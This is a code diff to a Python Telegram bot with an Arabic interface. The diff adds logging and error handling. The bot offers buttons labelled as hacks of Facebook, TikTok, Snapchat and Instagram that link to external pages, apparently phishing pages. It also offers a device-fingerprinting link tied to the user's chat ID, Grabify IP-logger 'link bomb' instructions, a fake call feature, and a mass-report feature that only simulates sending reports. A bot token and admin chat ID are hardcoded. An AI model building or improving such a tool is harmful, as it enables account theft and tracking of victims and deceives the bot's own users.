@@ -1,4 +1,4 @@
-import os, time, threading, random, string, requests
+import os, time, threading, random, string, requests, logging, traceback
 from flask import Flask, request
 from telebot import TeleBot, types
 
@@ -7,6 +7,11 @@ TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
 BASE_URL = "https://fgnral-html.onrender.com"
 WEBHOOK_URL = "https://gamee-08ue.onrender.com"
 CALL_SITE = "https://callmyphone.org/app"
+ADMIN_CHAT_ID = "6829017835"  # معرف الدردشة الخاص بك (لاستقبال تقارير الأخطاء)
+
+# تفعيل التسجيل
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
 bot = TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
@@ -29,18 +34,36 @@ def generate_password(length=16):
     chars = string.ascii_letters + string.digits + "!@#$%^&*()"
     return ''.join(random.choice(chars) for _ in range(length))
 
+def send_error_log(error_msg):
+    """إرسال تقرير خطأ إلى المشرف"""
+    try:
+        bot.send_message(ADMIN_CHAT_ID, f"⚠️ خطأ في بوت KING-SAQR:\n{error_msg[:3000]}")
+    except Exception as e:
+        logger.error(f"فشل في إرسال تقرير الخطأ: {e}")
+
 @app.route(f"/{TOKEN}", methods=['POST'])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
-        json_string = request.get_data().decode('utf-8')
-        update = types.Update.de_json(json_string)
-        bot.process_new_updates([update])
-        return ''
+        try:
+            json_string = request.get_data().decode('utf-8')
+            update = types.Update.de_json(json_string)
+            bot.process_new_updates([update])
+            return ''
+        except Exception as e:
+            logger.error(f"خطأ في معالجة webhook: {traceback.format_exc()}")
+            send_error_log(f"Webhook error: {e}")
+            return ''
     return '!', 403
 
-def main_menu(chat_id, edit=False, msg_id=None):
+@app.route("/health")
+def health_check():
+    return "OK", 200
+
+def main_menu_markup(chat_id):
+    """بناء لوحة الأزرار الرئيسية"""
     markup = types.InlineKeyboardMarkup(row_width=2)
 
+    # أدوات الاختراق
     tools_pairs = [
         ("📘 اختراق فيسبوك", "facebook.html", "🎵 اختراق تيك توك", "tiktok.html"),
         ("👻 اختراق سناب شات", "snapchat.html", "📷 اختراق انستقرام", "instagram.html"),
@@ -56,6 +79,7 @@ def main_menu(chat_id, edit=False, msg_id=None):
         markup.row(types.InlineKeyboardButton(left_name, url=left_url),
                    types.InlineKeyboardButton(right_name, url=right_url))
 
+    # البلاغات
     reports = [
         ("🐦 ضرب بلاغ تويتر X", "https://help.twitter.com/forms"),
         ("👻 ضرب بلاغ سناب شات", "https://support.snapchat.com/community-report"),
@@ -67,6 +91,7 @@ def main_menu(chat_id, edit=False, msg_id=None):
     for name, link in reports:
         markup.row(types.InlineKeyboardButton(name, callback_data=f"massreport|{name}|{link}"))
 
+    # أدوات إضافية
     markup.row(
         types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call_my_phone"),
         types.InlineKeyboardButton("📱 فحص مواصفات الجهاز", url=f"{BASE_URL}/device.html?chat={chat_id}")
@@ -89,109 +114,129 @@ def main_menu(chat_id, edit=False, msg_id=None):
     )
     markup.row(types.InlineKeyboardButton("🔄 رجوع", callback_data="main_menu"))
 
+    return markup
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    chat_id = message.chat.id
     text = ("🔱 <b>بوت الجنرال V2</b>\n\n"
             "أهلاً بك في لوحة التحكم المركزية. اختر الأداة المناسبة.\n\n"
             "⚡ جميع الأدوات تعمل بضغطة زر.\n"
             "⚠️ يُرجى استخدام البوت بمسؤولية.")
-    if edit and msg_id:
-        bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, reply_markup=markup, parse_mode="HTML")
-    else:
-        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    main_menu(message.chat.id)
+    try:
+        bot.send_message(chat_id, text, reply_markup=main_menu_markup(chat_id), parse_mode="HTML")
+        logger.info(f"تم إرسال القائمة إلى {chat_id}")
+    except Exception as e:
+        logger.error(f"فشل إرسال القائمة: {e}")
+        send_error_log(f"Start command failed: {e}")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id
     data = call.data
 
-    if data == "main_menu":
-        main_menu(chat_id, edit=True, msg_id=call.message.message_id)
-        bot.answer_callback_query(call.id)
+    try:
+        if data == "main_menu":
+            # تحديث الرسالة الحالية بدلاً من إرسال جديدة
+            text = ("🔱 <b>بوت الجنرال V2</b>\n\n"
+                    "أهلاً بك في لوحة التحكم المركزية. اختر الأداة المناسبة.\n\n"
+                    "⚡ جميع الأدوات تعمل بضغطة زر.\n"
+                    "⚠️ يُرجى استخدام البوت بمسؤولية.")
+            bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id,
+                                  reply_markup=main_menu_markup(chat_id), parse_mode="HTML")
+            bot.answer_callback_query(call.id)
 
-    elif data.startswith("massreport|"):
-        _, name, link = data.split("|", 2)
-        msg = bot.send_message(chat_id, f"⏳ جاري إرسال بلاغات هائلة لـ {name}...\n[░░░░░░░░░░] 0%")
-        bot.answer_callback_query(call.id)
-        def mass_report_simulation():
-            total = 120
-            for i in range(1, total+1):
-                time.sleep(0.06)
-                pct = int(i/total*100)
-                bar = "▓"*(pct//10) + "░"*(10 - pct//10)
-                try: bot.edit_message_text(f"🔥 {name}\n[{bar}] {pct}%\n📊 تم {i} بلاغ", chat_id=chat_id, message_id=msg.message_id)
-                except: pass
-            bot.edit_message_text(f"✅ تم {total} بلاغ!\n🔗 {link}", chat_id=chat_id, message_id=msg.message_id)
-        threading.Thread(target=mass_report_simulation).start()
+        elif data.startswith("massreport|"):
+            _, name, link = data.split("|", 2)
+            msg = bot.send_message(chat_id, f"⏳ جاري إرسال بلاغات هائلة لـ {name}...\n[░░░░░░░░░░] 0%")
+            bot.answer_callback_query(call.id)
 
-    elif data == "call_my_phone":
-        user_states[chat_id] = "waiting_call_number"
-        bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00)\nمثال: 967940201477")
-        bot.answer_callback_query(call.id)
+            def mass_report_simulation():
+                total = 120
+                for i in range(1, total + 1):
+                    time.sleep(0.06)
+                    pct = int(i / total * 100)
+                    bar = "▓" * (pct // 10) + "░" * (10 - pct // 10)
+                    try:
+                        bot.edit_message_text(f"🔥 {name}\n[{bar}] {pct}%\n📊 تم {i} بلاغ",
+                                            chat_id=chat_id, message_id=msg.message_id)
+                    except: pass
+                bot.edit_message_text(f"✅ تم {total} بلاغ!\n🔗 {link}", chat_id=chat_id, message_id=msg.message_id)
 
-    elif data == "network_tools":
-        tools = ("🛠️ <b>أدوات اختراق الشبكات:</b>\n"
-                 "1. Nmap\n2. Wireshark\n3. Metasploit\n4. Aircrack-ng\n"
-                 "5. Burp Suite\n6. John the Ripper\n7. Hydra\n8. Nikto\n"
-                 "9. SQLmap\n10. Hashcat\n\nKali Linux / Parrot OS")
-        bot.send_message(chat_id, tools, parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+            threading.Thread(target=mass_report_simulation).start()
 
-    elif data == "whatsapp_unban":
-        text = ("🔓 <b>فك حظر واتساب</b>\n\n"
-                "1. انسخ الرسالة التالية (عدّل رقمك):\n"
-                "<code>عزيزي فريق دعم واتساب،\nتم حظر رقمي ... رقمي هو: +967XXXXXXXX</code>\n\n"
-                "2. أرسلها إلى:\n"
-                "- smb@support.whatsapp.com\n"
-                "- android@support.whatsapp.com\n"
-                "- support@support.whatsapp.com\n\n"
-                "3. نصائح:\n"
-                "• استخدم رقمك مع رمز الدولة.\n"
-                "• انتظر 1-3 أيام للرد.\n"
-                "• لا تستخدم نسخ معدلة.")
-        bot.send_message(chat_id, text, parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+        elif data == "call_my_phone":
+            user_states[chat_id] = "waiting_call_number"
+            bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00)\nمثال: 967940201477")
+            bot.answer_callback_query(call.id)
 
-    elif data == "link_bomb":
-        bot.send_message(chat_id, "☠️ <b>تلغيم روابط</b>\n\nاستخدم Grabify:\n1. اذهب إلى grabify.link\n2. الصق الرابط\n3. احصل على رابط التتبع.", parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+        elif data == "network_tools":
+            tools = ("🛠️ <b>أدوات اختراق الشبكات:</b>\n"
+                     "1. Nmap\n2. Wireshark\n3. Metasploit\n4. Aircrack-ng\n"
+                     "5. Burp Suite\n6. John the Ripper\n7. Hydra\n8. Nikto\n"
+                     "9. SQLmap\n10. Hashcat\n\nKali Linux / Parrot OS")
+            bot.send_message(chat_id, tools, parse_mode="HTML")
+            bot.answer_callback_query(call.id)
 
-    elif data == "generate_password":
-        pwd = generate_password()
-        bot.send_message(chat_id, f"🔐 <b>كلمة مرور قوية:</b>\n<code>{pwd}</code>", parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+        elif data == "whatsapp_unban":
+            text = ("🔓 <b>فك حظر واتساب</b>\n\n"
+                    "1. انسخ الرسالة التالية (عدّل رقمك):\n"
+                    "<code>عزيزي فريق دعم واتساب،\nتم حظر رقمي ... رقمي هو: +967XXXXXXXX</code>\n\n"
+                    "2. أرسلها إلى:\n"
+                    "- smb@support.whatsapp.com\n"
+                    "- android@support.whatsapp.com\n"
+                    "- support@support.whatsapp.com\n\n"
+                    "3. نصائح:\n"
+                    "• استخدم رقمك مع رمز الدولة.\n"
+                    "• انتظر 1-3 أيام للرد.\n"
+                    "• لا تستخدم نسخ معدلة.")
+            bot.send_message(chat_id, text, parse_mode="HTML")
+            bot.answer_callback_query(call.id)
 
-    elif data == "tell_joke":
-        joke = random.choice(JOKES)
-        bot.send_message(chat_id, f"😂 <b>نكتة:</b>\n{joke}", parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+        elif data == "link_bomb":
+            bot.send_message(chat_id,
+                            "☠️ <b>تلغيم روابط</b>\n\nاستخدم Grabify:\n1. اذهب إلى grabify.link\n2. الصق الرابط\n3. احصل على رابط التتبع.",
+                            parse_mode="HTML")
+            bot.answer_callback_query(call.id)
 
-    elif data == "rate_bot":
-        global bot_rating
-        bot_rating += 1
-        bot.send_message(chat_id, f"⭐ شكراً! عدد التقييمات: {bot_rating}\nالتقييم: 5.0 🌟", parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+        elif data == "generate_password":
+            pwd = generate_password()
+            bot.send_message(chat_id, f"🔐 <b>كلمة مرور قوية:</b>\n<code>{pwd}</code>", parse_mode="HTML")
+            bot.answer_callback_query(call.id)
 
-    elif data == "terms":
-        terms = ("📜 <b>شروط الاستخدام</b>\n\n"
-                 "✅ لن أستخدم التطبيق فيما يغضب الله.\n"
-                 "✅ لن أسرق صور أو حسابات.\n"
-                 "✅ سأستخدمه للمزاح والربح المشروع فقط.\n"
-                 "⚠️ أُبرئ ذمة المطور من أي استخدام خاطئ.")
-        bot.send_message(chat_id, terms, parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+        elif data == "tell_joke":
+            joke = random.choice(JOKES)
+            bot.send_message(chat_id, f"😂 <b>نكتة:</b>\n{joke}", parse_mode="HTML")
+            bot.answer_callback_query(call.id)
 
-    elif data == "become_hacker":
-        steps = ("💻 <b>كيف تصبح هاكر:</b>\n"
-                 "1. أساسيات الشبكات\n2. Linux\n3. Python\n4. ثغرات الويب\n"
-                 "5. أدوات مثل Nmap, Burp\n6. منصات تدريب\n7. شهادات CEH/OSCP")
-        bot.send_message(chat_id, steps, parse_mode="HTML")
-        bot.answer_callback_query(call.id)
+        elif data == "rate_bot":
+            global bot_rating
+            bot_rating += 1
+            bot.send_message(chat_id, f"⭐ شكراً! عدد التقييمات: {bot_rating}\nالتقييم: 5.0 🌟", parse_mode="HTML")
+            bot.answer_callback_query(call.id)
 
-    else:
-        bot.answer_callback_query(call.id, text="غير معروف")
+        elif data == "terms":
+            terms = ("📜 <b>شروط الاستخدام</b>\n\n"
+                     "✅ لن أستخدم التطبيق فيما يغضب الله.\n"
+                     "✅ لن أسرق صور أو حسابات.\n"
+                     "✅ سأستخدمه للمزاح والربح المشروع فقط.\n"
+                     "⚠️ أُبرئ ذمة المطور من أي استخدام خاطئ.")
+            bot.send_message(chat_id, terms, parse_mode="HTML")
+            bot.answer_callback_query(call.id)
+
+        elif data == "become_hacker":
+            steps = ("💻 <b>كيف تصبح هاكر:</b>\n"
+                     "1. أساسيات الشبكات\n2. Linux\n3. Python\n4. ثغرات الويب\n"
+                     "5. أدوات مثل Nmap, Burp\n6. منصات تدريب\n7. شهادات CEH/OSCP")
+            bot.send_message(chat_id, steps, parse_mode="HTML")
+            bot.answer_callback_query(call.id)
+
+        else:
+            bot.answer_callback_query(call.id, text="غير معروف")
+    except Exception as e:
+        logger.error(f"خطأ في callback_handler: {traceback.format_exc()}")
+        send_error_log(f"Callback error: {e}")
+        bot.answer_callback_query(call.id, text="حدث خطأ، حاول مرة أخرى")
 
 @bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_call_number")
 def handle_call_number(msg):
@@ -208,12 +253,21 @@ def handle_call_number(msg):
 def keep_alive():
     while True:
         time.sleep(600)
-        try: requests.get(WEBHOOK_URL, timeout=5)
-        except: pass
+        try:
+            requests.get(f"{WEBHOOK_URL}/health", timeout=5)
+        except:
+            pass
 
 threading.Thread(target=keep_alive, daemon=True).start()
 
 if __name__ == '__main__':
-    bot.remove_webhook()
-    bot.set_webhook(url=f"{WEBHOOK_URL}/{TOKEN}")
+    # تعيين webhook
+    try:
+        bot.remove_webhook()
+        bot.set_webhook(url=f"{WEBHOOK_URL}/{TOKEN}")
+        logger.info("تم تعيين webhook بنجاح")
+    except Exception as e:
+        logger.error(f"فشل تعيين webhook: {e}")
+        send_error_log(f"Webhook setup failed: {e}")
+
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
